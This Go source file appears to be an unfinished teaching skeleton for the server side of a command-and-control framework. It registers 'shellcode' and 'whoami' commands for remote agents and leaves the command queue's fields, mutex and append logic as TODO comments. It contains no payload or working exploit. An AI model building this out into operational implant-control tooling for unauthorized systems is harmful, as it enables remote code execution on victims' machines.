package control

import (
	"encoding/json"
	"log"
)

// CommandValidator validates command-specific arguments
type CommandValidator func(json.RawMessage) error

// CommandProcessor processes command-specific arguments
type CommandProcessor func(json.RawMessage) (json.RawMessage, error)

// Registry of valid commands with their validators and processors
var validCommands = map[string]struct {
	Validator CommandValidator
	Processor CommandProcessor
}{
	"shellcode": {
		Validator: validateShellcodeCommand,
		Processor: processShellcodeCommand,
	},
	"whoami": {}, // No arguments needed
}

// CommandQueue stores commands ready for agent pickup
type CommandQueue struct {
	// TODO: Add field PendingCommands of type []CommandClient
	// TODO: add mutex
}

// AgentCommands is the global command queue
var AgentCommands = CommandQueue{
	// TODO: Assign field PendingCommands, use make() to instantiate
}

// addCommand adds a validated command to the queue
func (cq *CommandQueue) addCommand(command CommandClient) {
	// TODO: Lock mutex + defer Unlock

	// TODO: append command to cq.PendingCommands using append()
	log.Printf("QUEUED: %s", command.Command)
}
